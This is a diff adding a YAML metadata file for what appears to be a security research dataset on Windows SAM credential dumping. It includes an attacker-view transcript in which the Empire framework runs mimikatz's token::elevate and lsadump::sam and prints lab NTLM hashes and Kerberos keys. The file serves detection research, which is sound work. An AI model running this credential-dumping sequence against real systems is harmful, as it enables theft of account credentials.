@@ -1,0 +1,148 @@
+title: Empire Mimikatz SAM Extract Hashes
+id: SDWIN-190625103712
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/06/25
+modification_date: 2019/09/22
+platform:
+- Windows
+type: atomic
+tags:
+  - Calculating SysKey
+  - SAM Read
+  - SAM Handle Request
+description: This dataset represents adversaries calculating the SysKey to decrypt Security Account Mannager (SAM) database entries (from registry or hive) and get NTLM, and sometimes LM hashes of local accounts password.
+attack_mappings:
+  - technique: T1003
+    sub-technique: "002"
+    tactics:
+      - TA0006
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_sam_access.zip
+simulation:
+  environment: Mordor shire
+  tools:
+    - type: C2
+      name: Empire
+      module: mimikatz_sam
+      script: https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    (Empire: WE8XYD3K) > agents
+
+    [*] Active agents:
+
+    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+    ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+    WE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5972   5/0.0    2020-09-22 08:05:18  http            
+
+    (Empire: agents) > interact WE8XYD3K
+    (Empire: WE8XYD3K) > usemodule credentials/mimikatz/sam*
+    (Empire: powershell/credentials/mimikatz/sam) > info
+
+                  Name: Invoke-Mimikatz SAM dump
+                Module: powershell/credentials/mimikatz/sam
+            NeedsAdmin: True
+            OpsecSafe: True
+              Language: powershell
+    MinLanguageVersion: 2
+            Background: True
+      OutputExtension: None
+
+    Authors:
+      @JosephBialek
+      @gentilkiwi
+
+    Description:
+      Runs PowerSploit's Invoke-Mimikatz function to extract
+      hashes from the Security Account Managers (SAM) database.
+
+    Comments:
+      http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt
+      ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls
+      a
+
+    Options:
+
+      Name  Required    Value                     Description
+      ----  --------    -------                   -----------
+      Agent True        WE8XYD3K                  Agent to run module on.                 
+
+    (Empire: powershell/credentials/mimikatz/sam) > execute
+    [*] Tasked WE8XYD3K to run TASK_CMD_JOB
+    [*] Agent WE8XYD3K tasked with task ID 3
+    [*] Tasked agent WE8XYD3K to run module powershell/credentials/mimikatz/sam
+    (Empire: powershell/credentials/mimikatz/sam) > 
+    Job started: Z4KLXY
+
+    Hostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296
+
+      .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
+    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+      '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+    mimikatz(powershell) # token::elevate
+    Token Id  : 0
+    User name : 
+    SID name  : NT AUTHORITY\SYSTEM
+
+    696     {0;000003e7} 1 D 27257          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+    -> Impersonated !
+    * Process Token : {0;0010a7df} 2 F 10859624    THESHIRE\pgustavo       S-1-5-21-4228717743-1032521047-1810997296-1104  (17g,24p)       Primary
+    * Thread Token  : {0;000003e7} 1 D 12272014    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+    mimikatz(powershell) # lsadump::sam
+    Domain : WORKSTATION5
+    SysKey : 8e84403d1d0dcb7cac8f92c438143741
+    Local SID : S-1-5-21-2579707521-1384412784-3942915809
+
+    SAMKey : 506df337a2681cb7e4c265d30250d55d
+
+    RID  : 000001f4 (500)
+    User : wardog
+      Hash NTLM: 42ddb2963bbe8f1c075fc869d3bce33e
+
+    Supplemental Credentials:
+    * Primary:NTLM-Strong-NTOWF *
+        Random Value : 85c5e007a00c6fb1c5adf026cf9dd42f
+
+    * Primary:Kerberos-Newer-Keys *
+        Default Salt : WORKSTATION5Administrator
+        Default Iterations : 4096
+        Credentials
+          aes256_hmac       (4096) : d24867d975ac3fead7e604bc793bc32c42e4f599d0fd871cebca72444a9475a8
+          aes128_hmac       (4096) : d22a564882d258731c02684449a62b3c
+          des_cbc_md5       (4096) : ae58aed5d5cef143
+        OldCredentials
+          aes256_hmac       (4096) : e104dc2412faf5a1e65d1c10218130aa1d2d70d64bd103e36c6115d9f84c36c9
+          aes128_hmac       (4096) : eff1bddad41de0a68408261d362d1ad3
+          des_cbc_md5       (4096) : 15a8dc46a16e62bf
+
+    * Packages *
+        NTLM-Strong-NTOWF
+
+    * Primary:Kerberos *
+        Default Salt : WORKSTATION5Administrator
+        Credentials
+          des_cbc_md5       : ae58aed5d5cef143
+        OldCredentials
+          des_cbc_md5       : 15a8dc46a16e62bf
+
+    RID  : 000001f5 (501)
+    User : Guest
+
+    RID  : 000001f7 (503)
+    User : DefaultAccount
+
+    mimikatz(powershell) # token::revert
+    * Process Token : {0;0010a7df} 2 F 10859624    THESHIRE\pgustavo       S-1-5-21-4228717743-1032521047-1810997296-1104  (17g,24p)       Primary
+    * Thread Token  : no token
+
+    (Empire: powershell/credentials/mimikatz/sam) >
+references:
